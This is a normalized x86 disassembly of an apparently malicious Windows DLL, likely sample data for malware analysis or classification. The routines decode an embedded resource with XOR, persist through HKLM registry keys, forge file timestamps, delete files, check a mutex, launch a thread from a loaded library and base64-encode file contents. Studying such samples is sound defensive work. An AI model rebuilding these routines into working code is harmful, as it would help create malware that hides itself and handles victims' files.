sub_10001000
mov eax [ esp + 0x4 ]
push esi
or esi 0xffffffff
test eax eax
je r-xdata
mov eax esi
pop esi
retn
cmp [ eax + 0x1a ] 0x0
je r-xdata
push [ eax + 0x299 ]
add eax 0x29d
push eax
push 0x3
push 0x0
push rw-data
push [ esp + 0x20 ]
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
xor esi esi
sub_10001050
add esp 0xc
push [ esp + 0x14 ]
push esi
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
push rw-data
push esi
call sub_1000d310
push [ esp + 0x14 ]
push esi
call sub_1000d310
add esp 0x10
xor edi edi
sub_10001257
add esp 0x24
inc [ ebp - 0xd ]
inc [ edi ]
add ebx 0x208
dec [ ebp + 0xc ]
jne r-xdata
lea eax [ ebp - 0x240 ]
push esi
push eax
lea eax [ ebx - 0x104 ]
push eax
call sub_1000d31c
lea eax [ ebp - 0x348 ]
push esi
push eax
lea eax [ ebp - 0xfd20 ]
push eax
call sub_1000d31c
sub_100012fd
push esi
push edi
push 0x41
xor edx edx
pop ecx
xor eax eax
lea edi [ ebp - 0x137 ]
mov [ ebp - 0x138 ] dl
[ edi ]
push 0x41
lea edi [ ebp - 0x347 ]
pop ecx
mov [ ebp - 0x348 ] dl
[ edi ]
push 0x40
lea edi [ ebp - 0x23d ]
pop ecx
mov [ ebp - 0x240 ] 0x99
mov [ ebp - 0x23f ] 0x3a
mov [ ebp - 0x23e ] 0x5c
[ edi ]
stosw [ edi ]
xor eax eax
lea edi [ ebp - 0x1f ]
mov [ ebp - 0x20 ] dl
mov [ ebp - 0x30 ] dl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x2f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xf ]
mov [ ebp - 0x10 ] dl
mov ecx 0x4203
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x10b57 ]
mov [ ebp - 0x10b58 ] dl
mov esi [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
cmp esi edx
stosb [ edi ]
jne r-xdata
lea eax [ ebp - 0x138 ]
push 0x105
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
lea eax [ esi + 0x160 ]
push 0x10
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d31c
call [ GetLastError@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn
sub_1000148f
add esp 0x18
inc [ ebp - 0xd ]
inc [ edi ]
add ebx esi
dec [ ebp + 0xc ]
jne r-xdata
lea eax [ ebp - 0x138 ]
push esi
push eax
push ebx
call sub_1000d31c
mov esi [ DeleteFileA@IAT ]
push 0x4
lea edi [ ebp - 0x10b58 ]
pop ebx
push edi
call esi
add edi 0x208
dec ebx
jne r-xdata
lea eax [ ebp - 0x348 ]
push eax
call esi
xor eax eax
pop ebx
pop edi
pop esi
leave
retn
ordinal_3
push ebp
mov ebp esp
sub esp 0x114
push ebx
lea eax [ ebp - 0x4 ]
push esi
xor ebx ebx
push eax
xor esi esi
mov [ ebp - 0x4 ] ebx
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] bl
mov eax [ ebp - 0x4 ]
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
movzx ecx [ eax + 0x1a ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
push 0x3
push [ ebp + 0x8 ]
push eax
call sub_100010a1
sub_1000157a
add esp 0xc
lea eax [ ebp - 0x114 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0xf003f
push ebx
push ebx
add eax 0x31
push ebx
push eax
push 0x80000002
call [ RegCreateKeyExA@IAT ]
mov esi eax
pop edi
cmp esi ebx
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_100012f0
lea eax [ ebp - 0x8 ]
push eax
call sub_1000d360
pop ecx
inc eax
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push 0x1
add eax 0x130
push ebx
push eax
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
sub_100015f7
push ebx
push ebp
push esi
push edi
push rw-data
push 0x65
push [ rw-data ]
or ebp 0xffffffff
call [ FindResourceA@IAT ]
mov esi eax
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov ebp eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
mov edi eax
push edi
call [ malloc@IAT ]
mov esi [ esp + 0x18 ]
pop ecx
test eax eax
mov [ esi ] eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push edi
push 0x0
push eax
call sub_1000d316
sub_10001697
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
and [ ebp - 0x104 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x103 ]
push 0x2
push [ ebp + 0xc ]
[ edi ]
stosw [ edi ]
push esi
stosb [ edi ]
call sub_100010a1
sub_100016e2
add esp 0x18
lea eax [ ebp - 0x104 ]
push 0x80
push eax
call [ SetFileAttributesA@IAT ]
cmp [ esi + 0x20 ] 0x0
je r-xdata
dec [ esi + 0x1a ]
lea eax [ ebp - 0x104 ]
push eax
push esi
call sub_10001723
inc [ esi + 0x1a ]
pop ecx
pop ecx
mov eax edi
pop edi
pop esi
leave
retn
push [ ebp + 0xc ]
push esi
call sub_100017a0
sub_10001723
push ebx
push esi
xor esi esi
cmp [ esp + 0x10 ] esi
je r-xdata
or esi 0xffffffff
mov ebx [ esp + 0xc ]
cmp ebx esi
je r-xdata
push edi
xor eax eax
mov edi 0x62c
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
push ebp
push esi
push [ esp + 0x1c ]
call [ BeginUpdateResourceA@IAT ]
mov ebp eax
cmp ebp esi
jne r-xdata
push edi
push ebx
push esi
push 0x65
push rw-data
push ebp
call [ UpdateResourceA@IAT ]
mov esi eax
push 0x0
neg esi
sbb esi esi
push ebp
and esi 0x2
dec esi
dec esi
call [ EndUpdateResourceA@IAT ]
test eax eax
jne r-xdata
or esi 0xffffffff
jmp r-xdata
xor eax eax
pop ebp
push 0xfffffffd
pop esi
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
pop edi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_100017a0
push ebp
mov ebp esp
sub esp 0x424
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x31f ]
mov [ ebp - 0x320 ] bl
push 0x40
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x21b ]
mov [ ebp - 0x21c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x3f
xor eax eax
pop ecx
lea edi [ ebp - 0x117 ]
mov [ ebp - 0x118 ] bl
or [ ebp - 0x14 ] 0xffffffff
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push 0x3
push eax
lea eax [ ebp - 0x21c ]
push eax
mov [ ebp - 0x4 ] 0x99
mov [ ebp - 0x3 ] 0x3a
mov [ ebp - 0x2 ] 0x5c
mov [ ebp - 0x10 ] 0x100
mov [ ebp - 0x8 ] 0x1
call sub_1000d31c
sub_1000191d
add esp 0x20
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call sub_1000d310
lea eax [ ebp - 0x118 ]
mov [ ebp - 0x8 ] 0x3
push eax
call sub_1000d360
add esp 0xc
inc eax
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0x118 ]
push eax
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov [ ebp + 0x8 ] eax
call [ RegCloseKey@IAT ]
sub_1000197b
push ebp
mov ebp esp
sub esp 0x228
push esi
mov esi [ ebp + 0x8 ]
or eax 0xffffffff
test esi esi
je r-xdata
pop esi
leave
retn
and [ ebp - 0x228 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x227 ]
[ edi ]
and [ ebp - 0x124 ] 0x0
push 0x40
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x123 ]
push 0x7
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x1e ]
mov [ ebp - 0x1f ] 0x3a
[ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
push 0x104
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x228 ]
push eax
push esi
call sub_10001086
sub_10001a54
push ebp
mov ebp esp
sub esp 0x158
mov al [ rw-data ]
push esi
push edi
push 0x40
mov [ ebp - 0x158 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x157 ]
[ edi ]
stosw [ edi ]
xor esi esi
cmp [ ebp + 0x8 ] esi
stosb [ edi ]
je r-xdata
mov eax esi
pop edi
pop esi
leave
retn
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_1000d316
sub_10001b34
push ebp
mov ebp esp
sub esp 0x24
push ebx
or [ ebp - 0x4 ] 0xffffffff
push esi
push edi
push rw-data
push 0x66
push [ rw-data ]
call [ FindResourceA@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ LockResource@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x80
push ebx
mov esi [ CreateFileA@IAT ]
push edi
push 0x2
push ebx
push 0x1
push 0xc0000000
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ebx
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push eax
call [ WriteFile@IAT ]
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0xc ] eax
jne r-xdata
push ebx
push edi
push 0x3
push ebx
push 0x1
push 0x80000000
push rw-data
call esi
mov edi [ CloseHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call [ SetFileTime@IAT ]
sub_10001c3f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor eax eax
lea edi [ ebp - 0xe ]
mov [ ebp - 0x10 ] 0x99
mov [ ebp - 0xf ] 0x3a
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
mov bl 0x64
test al al
je r-xdata
pop edi
xor eax eax
pop ebx
leave
retn
mov [ ebp - 0x10 ] al
mov eax [ ebp + 0x8 ]
add eax 0x170
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d310
pop ecx
mov [ ebp - 0xb ] bl
pop ecx
push 0x7
pop esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
call [ SetFileAttributesA@IAT ]
inc bl
dec esi
mov [ ebp - 0xb ] bl
jne r-xdata
pop esi
sub_10001d72
add esp 0x18
lea eax [ ebp - 0x110 ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
leave
retn
push 0x4
push eax
mov [ ebp + 0x8 ] ebx
call [ GetProcAddress@IAT ]
lea ecx [ ebp + 0x8 ]
push ecx
push ebx
push 0x28
push eax
push ebx
push ebx
call [ CreateThread@IAT ]
jmp r-xdata
sub_10001ed1
add esp 0xc
test eax eax
jne r-xdata
push 0x80
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001c3f
add esp 0xc
cmp [ ebp - 0xc ] ebx
jne r-xdata
lea eax [ ebp - 0x214 ]
push eax
call [ LoadLibraryA@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call sub_100022a2
sub_10001f0c
push ebp
mov ebp esp
sub esp 0x560
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x20 ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x7f
mov [ ebp - 0x4 ] eax
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x55f ]
mov [ ebp - 0x560 ] bl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x35f ]
mov [ ebp - 0x360 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x140
lea eax [ ebp - 0x160 ]
push ebx
push eax
call sub_1000d316
sub_10001f6c
add esp 0xc
mov [ ebp - 0x4 ] 0x64
mov esi 0x200
inc [ ebp - 0x4 ]
inc ebx
cmp ebx 0x16
jbe r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x360 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x560 ]
push esi
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
xor al al
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10001fda
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov al [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test al al
movsb [ edi ] [ esi ]
je r-xdata
pop edi
pop esi
leave
retn
mov esi [ DeleteFileA@IAT ]
push 0x7
mov [ ebp - 0x10 ] al
mov [ ebp - 0x20 ] al
mov [ ebp - 0xb ] 0x64
pop edi
lea eax [ ebp - 0x10 ]
push eax
call esi
inc [ ebp - 0xb ]
dec edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call esi
sub_1000202a
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
or [ ebp - 0xc ] 0xffffffff
or [ ebp - 0x8 ] 0xffffffff
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] 0x8
cmp eax ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x19
mov [ ebp - 0x18 ] eax
mov al [ eax ]
cmp al 0xff
jne r-xdata
xor ecx ecx
cmp al bl
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0xf003f
push ebx
setne cl
push ebx
push ebx
inc ecx
push rw-data
push 0x80000002
mov [ ebp - 0x10 ] ecx
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
lea eax [ ebp - 0x10 ]
mov esi [ RegSetValueExA@IAT ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10001000
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
leave
retn
push 0x1
push [ ebp - 0x18 ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x1c ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
test eax eax
pop esi
jne r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov [ ebp - 0x8 ] ebx
sub_10002109
push ebp
mov ebp esp
sub esp 0x104
and [ ebp - 0x104 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
push 0x7d0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
dec eax
jne r-xdata
xor eax eax
push esi
mov esi [ CloseHandle@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
call sub_100021d7
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push 0x104
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
push 0x27
call ordinal_4
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x160
push eax
lea eax [ ebp - 0x104 ]
push eax
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
leave
retn 0xc
sub_100021d7
push ebp
mov ebp esp
sub esp 0x34
and [ ebp - 0x34 ] 0x0
push ebx
push esi
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x33 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
xor eax eax
and [ ebp - 0x14 ] al
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x14 ]
push 0xa
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x19 ]
push eax
call [ _itoa@IAT ]
mov esi rw-data
push 0x10
lea eax [ ebp - 0x34 ]
push esi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_1000d310
add esp 0x20
mov edi 0x20000
push esi
mov esi [ OpenMutexA@IAT ]
push 0x1
push edi
call esi
test eax eax
je r-xdata
mov ebx [ GetLastError@IAT ]
call ebx
cmp eax 0x2
jne r-xdata
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push edi
call esi
test eax eax
jne r-xdata
call ebx
cmp eax 0x2
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100022a2
push ebp
mov ebp esp
sub esp 0x168
or [ ebp - 0x20 ] 0xffffffff
and [ ebp - 0x8 ] 0x0
or [ ebp - 0x18 ] 0xffffffff
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi 0x100
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
mov [ ebp - 0x1c ] ebx
jne r-xdata
push edi
push 0x0
push ebx
call sub_1000d316
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_1000236f
add esp 0x18
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x1 ] 0x0
push [ ebp - 0xc ]
call [ free@IAT ]
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx rw-data
add eax 0x194
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push [ ebp - 0x1c ]
mov esi [ free@IAT ]
call esi
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
push edi
lea eax [ ebp - 0x18 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push eax
call sub_10002669
add esp 0x14
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push 0x0
push ecx
push 0x800
push [ ebp - 0x14 ]
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
push [ ebp - 0x14 ]
call esi
pop ecx
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
mov ebx [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x8 ]
cmp eax 0x5dc
jae r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0xa
jb r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push 0x800
push 0x0
push [ ebp - 0x14 ]
call sub_1000d316
lea eax [ eax + eax + 0x9 ]
push eax
call esi
mov esi eax
pop ecx
test esi esi
je r-xdata
inc [ ebp - 0x10 ]
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov esi [ malloc@IAT ]
mov eax [ ebp - 0x8 ]
lea eax [ eax + eax + 0x9 ]
push eax
push 0x0
push esi
call sub_1000d316
sub_10002482
push ebx
call sub_1000d360
push eax
push ebx
push esi
call [ strncpy@IAT ]
push ebx
call sub_1000d360
add [ ebp - 0x8 ] 0x6
add eax esi
push eax
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_1000256d
push esi
call sub_1000d360
mov [ ebp - 0x8 ] eax
mov [ esi + eax ] 0x25
mov eax [ ebp - 0x8 ]
push rw-data
mov [ esi + eax + 0x1 ] 0x25
mov eax [ ebp - 0x8 ]
and [ esi + eax + 0x2 ] 0x0
add [ ebp - 0x8 ] 0x2
push [ ebp - 0x8 ]
push esi
push [ ebp - 0x28 ]
push [ ebp - 0x1c ]
call sub_10002d02
add esp 0x44
test eax eax
ja r-xdata
push esi
call [ free@IAT ]
pop ecx
mov esi [ malloc@IAT ]
push 0x800
push 0x0
push [ ebp - 0x14 ]
call sub_1000d316
and [ ebp - 0x20 ] 0x0
sub_10002506
add esp 0xc
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
mov ebx [ ebp - 0x24 ]
push [ ebp - 0xc ]
call [ free@IAT ]
pop ecx
test ebx ebx
je r-xdata
push edi
lea eax [ ebp - 0x18 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push eax
call sub_10002669
add esp 0x14
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push 0x0
push ecx
push 0x800
push [ ebp - 0x14 ]
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x1c ]
mov esi [ free@IAT ]
call esi
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x8 ]
cmp eax 0x5dc
jae r-xdata
mov eax [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
leave
retn 0x4
push [ ebp - 0x14 ]
call esi
pop ecx
push 0x800
push 0x0
push [ ebp - 0x14 ]
call sub_1000d316
lea eax [ eax + eax + 0x9 ]
push eax
call esi
mov esi eax
pop ecx
test esi esi
je r-xdata
mov esi [ malloc@IAT ]
mov eax [ ebp - 0x8 ]
lea eax [ eax + eax + 0x9 ]
push eax
push 0x0
push esi
call sub_1000d316
sub_1000256d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi [ ebp + 0x10 ]
jle r-xdata
push [ ebp + 0xc ]
call sub_1000d360
pop ecx
mov [ ebp + 0x8 ] eax
pop esi
leave
retn
push ebx
push edi
push 0x1
pop edi
lea eax [ edi + 0x1 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov al [ edi + eax ]
mov [ ebp + 0x13 ] al
mov al [ ebp - 0x1 ]
and al 0x3f
mov [ ebp - 0x8 ] al
mov al bl
shr al 0x2
push eax
call sub_10002643
mov [ esi ] al
mov al [ ebp + 0x13 ]
and bl 0x3
inc esi
shl bl 0x4
shr al 0x4
or bl al
push ebx
call sub_10002643
mov [ esi ] al
pop ecx
inc esi
cmp edi [ ebp + 0x8 ]
pop ecx
jge r-xdata
mov eax [ ebp + 0xc ]
mov al [ edi + eax + 0x1 ]
mov [ ebp - 0x1 ] al
mov [ esi ] 0x3d
mov al [ ebp + 0x13 ]
mov cl [ ebp - 0x1 ]
and al 0xf
shl al 0x2
shr cl 0x6
or al cl
push eax
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
mov [ esi ] 0x3d
push [ ebp - 0x8 ]
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
lea eax [ edi + 0x1 ]
inc esi
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp + 0xc ]
and [ ebp + 0x13 ] 0x0
and [ ebp - 0x1 ] 0x0
cmp edi [ ebp + 0x8 ]
mov bl [ eax + edi - 0x1 ]
jge r-xdata
pop edi
pop ebx
add edi 0x3
inc esi
lea eax [ edi - 0x1 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
sub_10002643
mov al [ esp + 0x4 ]
cmp al 0x1a
jae r-xdata
cmp al 0x34
jae r-xdata
add eax 0x41
retn
cmp al 0x3e
jae r-xdata
add eax 0x47
retn
setne al
dec eax
and al 0xfc
add eax 0x2f
retn
sub eax 0x4
retn
sub_10002669
push ebp
mov ebp esp
sub esp 0x144
push ebx
push esi
mov esi 0x104
push edi
push esi
mov [ ebp - 0x4 ] 0x12
call [ malloc@IAT ]
mov ebx eax
xor edi edi
cmp ebx edi
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x140
lea eax [ ebp - 0x144 ]
push edi
push eax
call sub_1000d316
sub_100027d4
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] eax
or [ ebp - 0x34 ] 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
mov edi rw-data
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100043d2
mov esi 0x100
push esi
call [ malloc@IAT ]
add esp 0x10
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10002892
jmp r-xdata
push esi
push 0x0
push ebx
call sub_1000d316
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10002892
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x20 ]
call [ free@IAT ]
pop ecx
